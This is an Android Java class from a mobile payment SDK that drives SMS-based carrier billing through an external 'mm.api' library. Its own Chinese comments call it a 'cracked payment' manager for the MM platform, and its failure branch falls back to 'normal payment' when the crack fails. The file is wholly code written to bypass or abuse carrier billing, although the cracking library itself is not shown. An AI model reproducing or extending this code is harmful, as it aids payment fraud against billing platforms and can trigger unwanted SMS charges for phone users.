package mobi.zty.pay.sdk.ananFee;

import mm.api.MMApiException;
import mm.api.SMSResponse;
import mm.api.android.MMApi;
import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.util.Util_G;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;

/**
 * mm网络破解支付管理类
 * @author Administrator
 *
 */
public class AnAnFeeInstance extends PaymentInterf{
	public boolean initSUCC = true;
	private static AnAnFeeInstance instance;
	private Handler callBHandler = null;
	private SMSResponse response = null;
	public static AnAnFeeInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized AnAnFeeInstance scyMMpay(){
		if(instance==null){
			instance =  new AnAnFeeInstance();
		}
		return instance;
	}
	@Override
	public void init(final Context context, Object... parameters) {
		final String appKey = (String) parameters[0];
		final String channelId = (String) parameters[1];
		callBHandler = (Handler) parameters[2];
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				try {
					MMApi.appStart((Activity)context);
					MMApi.appStart((Activity)context, appKey, channelId);
					initSUCC = true;
					Util_G.debugE("FEE", "an init succ!");
				} catch (MMApiException e) {
					initSUCC = false;
					e.printStackTrace();
				}
			}
		}).start();
		
	}
	
	/**
	 * 支付结果通知 
	 * @param type 1成功
	 */
	@Override
	public void notifyPay(int type){
		super.notifyPay(type);
		if (response == null) return;
		switch (type) {
		case 1://支付成功
			response.sendMessageSuccess();
			break;
		default://支付失败
			response.sendMessageFailed();
			break;
		}
		
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		if (!initSUCC) {
			PayResultInfo info = new PayResultInfo();
			info.resutCode = PayConfig.MM_INIT_FAIL;
			info.retMsg = "anan初始化失败";
			Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
			message.obj = info;
			message.sendToTarget();
			return;
		}
		final String appKey = (String) parameters[0];
		final String payCode = (String) parameters[1];
		final String channelId = (String) parameters[2];
		final String exData = (String) parameters[3];
		
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				try {
					Util_G.debugE("FEE", "an pay doing!");
					SMSResponse response = MMApi.getSms(context, appKey, Long.parseLong(payCode), channelId, exData);
					Intent itSend = new Intent(GameSDK.SENT_SMS_ACTION);  
			        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
			        GameSDK.getInstance().bCallback = 0; 
			        if (response.isMustSend()) {
			        	callBHandler.sendEmptyMessageDelayed(PayConfig.NATIVE_FEE_FAIL, 20000);
			        	response.requestSendMessage(mSendPI, null);
					}else{
						PayResultInfo info = new PayResultInfo();
						info.resutCode = PayConfig.BIIL_SUCC;
						info.retMsg = "支付成功！";
						Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
						message.obj = info;
						message.sendToTarget();
					}
				} catch (Exception e) {
					PayResultInfo info = new PayResultInfo();
					info.resutCode = PayConfig.FEE_FAIL_TO_OTHER;
					info.retMsg = "破解失败转正常支付";
					Message message = callBHandler.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = info;
					message.sendToTarget();
					e.printStackTrace();
				}
			}
		}).start();
	}
}
